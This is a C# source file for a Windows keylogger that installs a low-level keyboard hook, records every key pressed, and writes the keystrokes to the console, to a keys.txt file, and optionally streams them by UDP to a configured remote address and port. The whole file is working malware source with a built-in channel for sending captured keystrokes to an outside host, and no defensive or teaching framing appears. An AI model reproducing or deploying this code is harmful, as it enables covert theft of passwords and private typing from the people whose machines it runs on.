using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Keylogger
{
    class Keylogger
    {
        private readonly Settings _settings;
        private FileInfo _file;
        private IPEndPoint _endpoint;
        private Socket _socket;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static IntPtr _hookID = IntPtr.Zero;

        public Keylogger(Settings settings, string location)
        {
            _settings = settings;
            if (_settings.WriteToFile)
            {
                _file = new FileInfo(location + @"\keys.txt");
            }
            
            if (_settings.StreamOverNetwork)
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                _endpoint = new IPEndPoint(IPAddress.Parse(_settings.NetworkAddress), _settings.NetworkPort);
            }            
        }

        public void StartKeylogger()
        {
            _hookID = SetHook(HookCallback);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                Output((Keys)vkCode);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void Output(Keys item)
        {
            if (_settings.WriteToConsole)
            {
                Console.Write(item);
            }
            if (_settings.WriteToFile)
            {
                WriteToFile(item.ToString());
            }

            if (_settings.StreamOverNetwork)
            {
                WriteToSocket(item.ToString());
            }
        }

        private void WriteToFile(string item)
        {                
            using (StreamWriter sw = File.AppendText(_file.FullName))
            {
                sw.Write(item);
            }
        }

        private void WriteToSocket(string item)
        {
            _socket.SendTo(Encoding.ASCII.GetBytes(item), _endpoint);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
